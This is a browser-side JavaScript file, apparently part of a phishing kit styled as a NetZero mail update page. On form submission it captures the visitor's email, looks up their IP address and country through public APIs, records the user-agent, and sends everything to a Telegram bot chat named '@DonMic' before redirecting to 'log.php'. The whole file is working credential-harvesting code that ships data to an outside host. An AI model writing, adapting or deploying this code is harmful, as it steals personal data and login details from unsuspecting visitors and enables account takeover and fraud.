// netzero_update.js
// Fully client-side JavaScript version (runs in browser)
// Sends data directly to Telegram via Bot API (replace TOKEN and CHAT_ID)

(function() {
    // === CONFIGURATION ===
    const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE';  // e.g., 7123456789:AAF...
    const TELEGRAM_CHAT_ID = '@DonMic';                // or numeric ID like 123456789
    // =====================

    // Helper: Get visitor country via ip-api.com (free, no key needed for basic use)
    async function getVisitorCountry() {
        try {
            const res = await fetch('https://ip-api.com/json/');
            const data = await res.json();
            return data.country || 'Unknown';
        } catch (e) {
            return 'Unknown';
        }
    }

    // Helper: Get user IP (best effort via public API)
    async function getUserIP() {
        try {
            const res = await fetch('https://api.ipify.org?format=json');
            const data = await res.json();
            return data.ip;
        } catch (e) {
            return 'Unknown';
        }
    }

    // Helper: Format date like PHP's "D M d, Y g:i a"
    function formatDate() {
        const days = ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat'];
        const months = ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'];
        const now = new Date();
        const dayName = days[now.getDay()];
        const monthName = months[now.getMonth()];
        const day = String(now.getDate()).padStart(2, '0');
        const year = now.getFullYear();
        let hours = now.getHours();
        const minutes = String(now.getMinutes()).padStart(2, '0');
        const ampm = hours >= 12 ? 'PM' : 'AM';
        hours = hours % 12;
        hours = hours ? hours : 12; // 0 → 12
        const time = `${hours}:${minutes} ${ampm}`;
        return `${dayName} ${monthName} ${day} ${year} ${time}`;
    }

    // Main: Capture form and send to Telegram
    document.addEventListener('DOMContentLoaded', async () => {
        const form = document.querySelector('form');
        if (!form) return;

        const emailInput = form.querySelector('input[type="email"], input[name="email"]');
        if (!emailInput) return;

        form.addEventListener('submit', async (e) => {
            e.preventDefault();

            const email = emailInput.value.trim();
            if (!email) return;

            const ip = await getUserIP();
            const country = await getVisitorCountry();
            const date = formatDate();
            const browser = navigator.userAgent;

            const message = `
**Telegram ID: @DonMic My NetZero Personal *1st Src***+++
Email : ${email}
User-!P : ${ip}
Country : ${country}

----------------------------------------
Date : ${date}
User-Agent: ${browser}
            `.trim();

            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
            const payload = {
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            };

            try {
                await fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
            } catch (err) {
                console.error('Telegram send failed:', err);
            }

            // Redirect after sending
            setTimeout(() => {
                window.location.href = 'log.php'; // or any next page
            }, 300);
        });
    });
})();